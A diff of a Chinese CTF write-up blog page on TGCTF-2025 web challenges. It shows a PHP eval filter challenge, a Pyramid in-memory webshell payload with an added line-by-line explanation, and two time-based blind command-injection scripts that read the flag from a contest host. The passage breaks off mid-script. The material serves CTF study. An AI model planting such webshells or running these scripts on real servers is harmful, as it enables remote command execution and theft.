@@ -6,23 +6,30 @@
   <meta name="keywords" content=" sql注入 , 比赛复现 , upload , RCE , CVE , 目录穿越 , 内存马 , 时间盲注 ">
   <meta name="description" content="TGCTF-2025复现 | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="CISCN2019华东南赛区-DoubleSecret1打开后看到这样一句话 1Welcome To Find Secret  尝试搜索页面，&#x2F;secret 然后又是提示信息 1Tell me your secret.I will encrypt it so others can&#x27;t see  让我们传入数值，然后他会给我们加密，我们随便输点东西。报错了  1234567891">
+<meta name="description" content="GKCTF2021-easycms题目提示后台密码5位弱口令，然后扫描后台扫出admin.php登录页面，然后直接弱口令登录 12admin12345  然后成功登录后台管理页面。 然后这题有两种解法 解法1 getshell进入 设计-&gt;高级，可以找到这里有一个控制主页面的可执行代码，如果我们改成木马就可以拿到shell了 显示请在服务器创建&#x2F;var&#x2F;www&#x2F;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CISCN2019华东南赛区-DoubleSecret1">
-<meta property="og:url" content="https://mixbp.github.io/master/2025/04/15/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-DoubleSecret1/index.html">
+<meta property="og:title" content="GKCTF2021-easycms">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/04/17/GKCTF2021-easycms/index.html">
 <meta property="og:site_name" content="MIXBP">
-<meta property="og:description" content="CISCN2019华东南赛区-DoubleSecret1打开后看到这样一句话 1Welcome To Find Secret  尝试搜索页面，&#x2F;secret 然后又是提示信息 1Tell me your secret.I will encrypt it so others can&#x27;t see  让我们传入数值，然后他会给我们加密，我们随便输点东西。报错了  1234567891">
+<meta property="og:description" content="GKCTF2021-easycms题目提示后台密码5位弱口令，然后扫描后台扫出admin.php登录页面，然后直接弱口令登录 12admin12345  然后成功登录后台管理页面。 然后这题有两种解法 解法1 getshell进入 设计-&gt;高级，可以找到这里有一个控制主页面的可执行代码，如果我们改成木马就可以拿到shell了 显示请在服务器创建&#x2F;var&#x2F;www&#x2F;">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://mixbp.github.io/image/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-DoubleSecret1-1.png">
-<meta property="article:published_time" content="2025-04-15T13:39:44.000Z">
-<meta property="article:modified_time" content="2025-04-15T13:54:53.355Z">
+<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-1.png">
+<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-2.png">
+<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-3.png">
+<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-4.png">
+<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-5.png">
+<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-6.png">
+<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-7.png">
+<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-8.png">
+<meta property="article:published_time" content="2025-04-17T07:41:55.000Z">
+<meta property="article:modified_time" content="2025-04-17T08:22:53.025Z">
 <meta property="article:author" content="MIXBP">
-<meta property="article:tag" content="刷题笔记">
-<meta property="article:tag" content="信息搜集">
-<meta property="article:tag" content="RC4加密">
-<meta property="article:tag" content="ssti">
+<meta property="article:tag" content="弱口令密码">
+<meta property="article:tag" content="getshell">
+<meta property="article:tag" content="任意文件下载">
+<meta property="article:tag" content="cms">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://mixbp.github.io/image/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-DoubleSecret1-1.png">
+<meta name="twitter:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -121,7 +128,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(90)</small>
+                <small>(94)</small>
             
         </div>
     </li>
@@ -156,8 +163,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="90">
-<input type="hidden" id="yelog_site_word_count" value="179k">
+<input type="hidden" id="yelog_site_posts_number" value="94">
+<input type="hidden" id="yelog_site_word_count" value="181.4k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -287,7 +294,15 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>任意文件下载</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>日志包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>弱口令密码</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -300,6 +315,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>特殊变量名传参</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>图片隐写</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -375,6 +394,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>binwalk文件提取</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>bottle</a>
             </li>
         
@@ -388,6 +411,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>chr函数构造命令</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>cms</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -436,6 +463,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>gc回收</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>getshell</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -595,6 +626,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>python内存马</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>RC4加密</a>
             </li>
         
@@ -655,6 +690,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>thinkphp v6.0任意文件操作漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>unicode</a>
             </li>
         
@@ -664,6 +703,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>waf绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>webshell</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -678,6 +721,10 @@
                 <i class="iconfont icon-tag"></i><a>xxe</a>
             </li>
         
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ziperello工具暴力破解</a>
+            </li>
+        
     </div>
 
 </div>
@@ -688,6 +735,42 @@
     </div>
     
     <nav id="title-list-nav">
+        
+        
+        <a  class="All "
+           href="/2025/04/17/GYCTF2020-EasyThinking/"
+           data-tag="刷题笔记,代码审计,thinkphp v6.0任意文件操作漏洞,webshell"
+           data-author="" >
+            <span class="post-title" title="GYCTF2020-EasyThinking">GYCTF2020-EasyThinking</span>
+            <span class="post-date" title="2025-04-17 16:40:30">2025/04/17</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/17/GKCTF2021-easycms/"
+           data-tag="弱口令密码,getshell,任意文件下载,cms"
+           data-author="" >
+            <span class="post-title" title="GKCTF2021-easycms">GKCTF2021-easycms</span>
+            <span class="post-date" title="2025-04-17 15:41:55">2025/04/17</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/16/%E4%BA%8C%E7%BB%B4%E7%A0%811/"
+           data-tag="图片隐写,binwalk文件提取,ziperello工具暴力破解"
+           data-author="" >
+            <span class="post-title" title="二维码1">二维码1</span>
+            <span class="post-date" title="2025-04-16 20:08:51">2025/04/16</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/16/python%E5%86%85%E5%AD%98%E9%A9%AC/"
+           data-tag="python内存马"
+           data-author="" >
+            <span class="post-title" title="python内存马">python内存马</span>
+            <span class="post-date" title="2025-04-16 19:31:49">2025/04/16</span>
+        </a>
         
         
         <a  class="All "
@@ -1550,12 +1633,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2025-04-15 18:06:34'>2025-04-15 14:10</time>
+            Created At : <time class="date" title='Updated At: 2025-04-17 16:24:03'>2025-04-15 14:10</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:2.6k</span>
+        <span>Count:3.1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1602,7 +1685,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="AAA偷渡阴平（复仇）"><a href="#AAA偷渡阴平（复仇）" class="headerlink" title="AAA偷渡阴平（复仇）"></a>AAA偷渡阴平（复仇）</h1><p>源码：</p>
-<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"> <span class="hljs-variable">&lt;?php</span><br><span class="hljs-variable"></span><br><span class="hljs-variable"></span><br><span class="hljs-variable">$tgctf2025=$_GET[&#x27;tgctf2025&#x27;];</span><br><span class="hljs-variable"></span><br><span class="hljs-variable">if(!preg_match(&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">localeconv</span>|<span class="hljs-string">pos</span>|<span class="hljs-string">current</span>|<span class="hljs-string">print</span>|<span class="hljs-string">var</span>|<span class="hljs-string">dump</span>|<span class="hljs-string">getallheaders</span>|<span class="hljs-string">get</span>|<span class="hljs-string">defined</span>|<span class="hljs-string">str</span>|<span class="hljs-string">split</span>|<span class="hljs-string">spl</span>|<span class="hljs-string">autoload</span>|<span class="hljs-string">extensions</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">phpversion</span>|<span class="hljs-string">floor</span>|<span class="hljs-string">sqrt</span>|<span class="hljs-string">tan</span>|<span class="hljs-string">cosh</span>|<span class="hljs-string">sinh</span>|<span class="hljs-string">ceil</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">dir</span>|<span class="hljs-string">getcwd</span>|<span class="hljs-string">getallheaders</span>|<span class="hljs-string">end</span>|<span class="hljs-string">next</span>|<span class="hljs-string">prev</span>|<span class="hljs-string">reset</span>|<span class="hljs-string">each</span>|<span class="hljs-string">pos</span>|<span class="hljs-string">current</span>|<span class="hljs-string">array</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">pop</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">content</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">readfile</span>|<span class="hljs-string">highlight</span>|<span class="hljs-string">show</span>|<span class="hljs-string">source</span>|<span class="hljs-string">file</span>|<span class="hljs-string">assert/i&quot;, $tgctf2025))&#123;</span><br><span class="hljs-string">    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br><span class="hljs-string">    eval($tgctf2025);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">else&#123;</span><br><span class="hljs-string">    die(&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">highlight_file(__FILE__);</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"> <span class="hljs-variable">&lt;?php</span><br><span class="hljs-variable"></span><br><span class="hljs-variable"></span><br><span class="hljs-variable">$tgctf2025=$_GET[&#x27;tgctf2025&#x27;];</span><br><span class="hljs-variable"></span><br><span class="hljs-variable">if(!preg_match(&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">localeconv</span>|<span class="hljs-string">pos</span>|<span class="hljs-string">current</span>|<span class="hljs-string">print</span>|<span class="hljs-string">var</span>|<span class="hljs-string">dump</span>|<span class="hljs-string">getallheaders</span>|<span class="hljs-string">get</span>|<span class="hljs-string">defined</span>|<span class="hljs-string">str</span>|<span class="hljs-string">split</span>|<span class="hljs-string">spl</span>|<span class="hljs-string">autoload</span>|<span class="hljs-string">extensions</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">phpversion</span>|<span class="hljs-string">floor</span>|<span class="hljs-string">sqrt</span>|<span class="hljs-string">tan</span>|<span class="hljs-string">cosh</span>|<span class="hljs-string">sinh</span>|<span class="hljs-string">ceil</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">dir</span>|<span class="hljs-string">getcwd</span>|<span class="hljs-string">getallheaders</span>|<span class="hljs-string">end</span>|<span class="hljs-string">next</span>|<span class="hljs-string">prev</span>|<span class="hljs-string">reset</span>|<span class="hljs-string">each</span>|<span class="hljs-string">pos</span>|<span class="hljs-string">current</span>|<span class="hljs-string">array</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">pop</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">content</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">readfile</span>|<span class="hljs-string">highlight</span>|<span class="hljs-string">show</span>|<span class="hljs-string">source</span>|<span class="hljs-string">file</span>|<span class="hljs-string">assert/i&quot;, $tgctf2025))&#123;</span><br><span class="hljs-string">    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br><span class="hljs-string">    eval($tgctf2025);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">else&#123;</span><br><span class="hljs-string">    die(&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">highlight_file(__FILE__);</span><br></code></pre></td></tr></table></figure>
 
 <p>这题就是之前那题的升级版，把无参数RCE给ban了，依旧是让我们去使用eval危险函数进行命令执行。</p>
 <p>当时做这题的时候感觉太难了做不了一点，结果发现题解就是学过的利用session进行无参数RCE，感觉天塌了，这都没想到，当时是以为要用什么其他方法无参RCE用不了。</p>
@@ -1698,6 +1781,9 @@
 <p>1、内存马</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">expr</span>=exec(&quot;config.add_route(&#x27;shell_route&#x27;,&#x27;/17shell&#x27;);config.add_view(lambda<br>request:Response(import(<span class="hljs-string">&#x27;os&#x27;</span>).popen(request.params.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;1&#x27;</span>)).read()),route<br><span class="hljs-attribute">_name</span>=<span class="hljs-string">&#x27;shell_route&#x27;</span>);app = config.make_wsgi_app()<span class="hljs-string">&quot;)</span><br><span class="hljs-string">/17shell?1=ls /</span><br></code></pre></td></tr></table></figure>
 
+<p><strong>对内存马进行分析：</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import sys<br>这行代码导入了Python的标准库模块sys，用于访问与Python解释器紧密相关的变量和函数。<br><br>config = sys<span class="hljs-selector-class">.modules</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__main__&#x27;</span>]</span><span class="hljs-selector-class">.config</span><br>这当前运行环境中存在名为config的对象，并且它是全局命名空间的一部分（即位于__main__模块中）。config对象通常用于存储应用程序配置信息，在Pyramid框架中，它还负责定义应用的行为，如路由规则等。<br>app = sys<span class="hljs-selector-class">.modules</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__main__&#x27;</span>]</span><span class="hljs-selector-class">.app</span><br><br>类似地，app也被认为是在全局命名空间中存在的一个变量，代表了WSGI兼容的应用实例。<span class="hljs-built_in">WSGI</span>(Web Server Gateway Interface)是一种用于Python web应用和服务之间通信的标准接口。<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(config)</span></span><br>这行代码简单地打印出config对象的内容，为了更好调试，检查其是否正确加载。<br><br>config<span class="hljs-selector-class">.add_route</span>(<span class="hljs-string">&#x27;shell&#x27;</span>, <span class="hljs-string">&#x27;/shell&#x27;</span>)<br>此行调用了config对象的方法add_route，用于向Web应用添加一个新的URL路由。这里的路由名称为<span class="hljs-string">&#x27;shell&#x27;</span>，对应的路径是<span class="hljs-string">&#x27;/shell&#x27;</span>。这意味着当用户访问这个特定的URL时，会触发与之关联的视图逻辑。<br><br>config<span class="hljs-selector-class">.add_view</span>(lambda request: <span class="hljs-built_in">Response</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.popen</span>(request<span class="hljs-selector-class">.params</span><span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;1&#x27;</span>))<span class="hljs-selector-class">.read</span>()), route_name=<span class="hljs-string">&#x27;shell&#x27;</span>)<br>这是关键的一行，它定义了一个匿名函数（lambda表达式），该函数接受一个request参数并返回一个HTTP响应。在这个过程中，它使用了<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.popen</span>(...)来执行操作系统命令。更具体地说，它从请求参数中获取键为<span class="hljs-string">&#x27;1&#x27;</span>的值，并将其作为命令传递给系统shell执行。然后，它读取命令执行的结果，并通过Response对象将其作为HTTP响应体发送回客户端。<br><br>app = config<span class="hljs-selector-class">.make_wsgi_app</span>()<br>最后，这行代码调用了config上的make_wsgi_app方法，创建了一个新的WSGI应用实例，并将其赋值给app变量。这一步骤完成了应用的构建过程。<br></code></pre></td></tr></table></figure>
+
 <p>2、request.add_response_callback 钩子函数进行回显。（是个好方法，但是这里用 不了，因为exec不在home_view下没有request）</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">print</span>(<span class="hljs-built_in">exec</span>(&quot;request.<span class="hljs-built_in">add_response_callback</span>(lambda request,<br><span class="hljs-attribute">response</span>:<span class="hljs-built_in">setattr</span>(response, <span class="hljs-string">&#x27;text&#x27;</span>, <span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">import</span>(<span class="hljs-string">&#x27;os&#x27;</span>),<span class="hljs-string">&#x27;popen&#x27;</span>)<br>(<span class="hljs-string">&#x27;whoami&#x27;</span>),<span class="hljs-string">&#x27;read&#x27;</span>)()))&quot;));<br></code></pre></td></tr></table></figure>
 
@@ -1705,7 +1791,7 @@
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim">import <span class="hljs-built_in">string</span><br>import requests<br>import time<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:59439/&quot;</span><br>ans = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> strr in <span class="hljs-built_in">string</span>.printable:<br>        <span class="hljs-keyword">shell</span> = <span class="hljs-keyword">f</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">&quot;</span><br>import os<br>import time<br><span class="hljs-keyword">a</span> = os.popen(<span class="hljs-string">&#x27;cat /fl*&#x27;</span>).<span class="hljs-keyword">read</span>()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-keyword">a</span>) &gt; &#123;i&#125; <span class="hljs-built_in">and</span> <span class="hljs-keyword">a</span>[&#123;i&#125;] == <span class="hljs-string">&#x27;&#123;strr&#125;&#x27;</span>:<br>	time.<span class="hljs-keyword">sleep</span>(<span class="hljs-number">2</span>)<br><span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">&quot;</span><br>        start = time.time()<br>        requests.post(url, data=&#123;<span class="hljs-string">&#x27;expr&#x27;</span>: <span class="hljs-keyword">shell</span>&#125;)<br>        end = time.time()<br>        <span class="hljs-keyword">if</span> end - start &gt; <span class="hljs-number">2</span>:<br>            ans += strr<br>            <span class="hljs-keyword">print</span>(ans)<br></code></pre></td></tr></table></figure>
 
 <p>另一个脚本（这个更稳定，也更难看懂）</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs vim">import requests<br>import time<br><br>def cmd(cmd):<br>    url = <span class="hljs-string">&quot;http://node1.tgctf.woooo.tech:32142/&quot;</span><br>    # url = <span class="hljs-string">&quot;http://127.0.0.1:9040/&quot;</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        flag = True<br>        <span class="hljs-keyword">left</span> = <span class="hljs-number">33</span><br>        <span class="hljs-keyword">right</span> = <span class="hljs-number">126</span><br><br>        <span class="hljs-keyword">while</span> True:<br>            data = &#123;<br>                <span class="hljs-string">&quot;expr&quot;</span>: <span class="hljs-keyword">f</span><span class="hljs-string">&#x27;a=__import__(&quot;os&quot;).popen(&quot;&#123;cmd&#125;&quot;).read()\nif(ord(a[&#123;i&#125;])&lt;&#123;(left+right)//2&#125;):__import__(&quot;time&quot;).sleep(1)&#x27;</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> flag:<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">res</span> = requests.post(url, data=data)<br>                except Exception <span class="hljs-keyword">as</span> err:<br>                    pass<br>                # <span class="hljs-keyword">print</span>(<span class="hljs-keyword">res</span>.text)<br>                flag = False<br><br>            start = time.time()<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">res</span> = requests.post(url, data=data)<br>            except Exception <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>:<br>                <span class="hljs-keyword">print</span>(<span class="hljs-keyword">e</span>)<br>                i -= <span class="hljs-number">1</span><br>                <span class="hljs-keyword">continue</span><br><br>            end = time.time()<br>            <span class="hljs-keyword">print</span>(<span class="hljs-keyword">left</span>, <span class="hljs-keyword">right</span>, (<span class="hljs-keyword">left</span>+<span class="hljs-keyword">right</span>)//<span class="hljs-number">2</span>, end-start)<br>            <br>            <span class="hljs-keyword">if</span> end - start &gt; <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">right</span> = (<span class="hljs-keyword">left</span>+<span class="hljs-keyword">right</span>)//<span class="hljs-number">2</span>-<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">left</span> = (<span class="hljs-keyword">left</span>+<span class="hljs-keyword">right</span>)//<span class="hljs-number">2</span>+<span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">left</span> &gt; <span class="hljs-keyword">right</span>:<br>                # <span class="hljs-keyword">print</span>(chr(<span class="hljs-keyword">left</span>-<span class="hljs-number">1</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br>                result += chr(<span class="hljs-keyword">left</span>-<span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">print</span>(result)<br>                <span class="hljs-keyword">break</span><br><br><br>cmd(<span class="hljs-string">&#x27;cat /f*&#x27;</span>)<br><br><br></code></pre></td></tr></table></figure>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs vim">import requests<br>import time<br><br>def cmd(cmd):<br>    url = <span class="hljs-string">&quot;http://node1.tgctf.woooo.tech:32142/&quot;</span><br>    # url = <span class="hljs-string">&quot;http://127.0.0.1:9040/&quot;</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        flag = True<br>        <span class="hljs-keyword">left</span> = <span class="hljs-number">33</span><br>        <span class="hljs-keyword">right</span> = <span class="hljs-number">126</span><br><br>        <span class="hljs-keyword">while</span> True:<br>            data = &#123;<br>                <span class="hljs-string">&quot;expr&quot;</span>: <span class="hljs-keyword">f</span><span class="hljs-string">&#x27;a=__import__(&quot;os&quot;).popen(&quot;&#123;cmd&#125;&quot;).read()\nif(ord(a[&#123;i&#125;])&lt;&#123;(left+right)//2&#125;):__import__(&quot;time&quot;).sleep(1)&#x27;</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> flag:<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">res</span> = requests.post(url, data=data)<br>                except Exception <span class="hljs-keyword">as</span> err:<br>                    pass<br>                # <span class="hljs-keyword">print</span>(<span class="hljs-keyword">res</span>.text)<br>                flag = False<br><br>            start = time.time()<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">res</span> = requests.post(url, data=data)<br>            except Exception <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>:<br>                <span class="hljs-keyword">print</span>(<span class="hljs-keyword">e</span>)<br>                i -= <span class="hljs-number">1</span><br>                <span class="hljs-keyword">continue</span><br><br>            end = time.time()<br>            <span class="hljs-keyword">print</span>(<span class="hljs-keyword">left</span>, <span class="hljs-keyword">right</span>, (<span 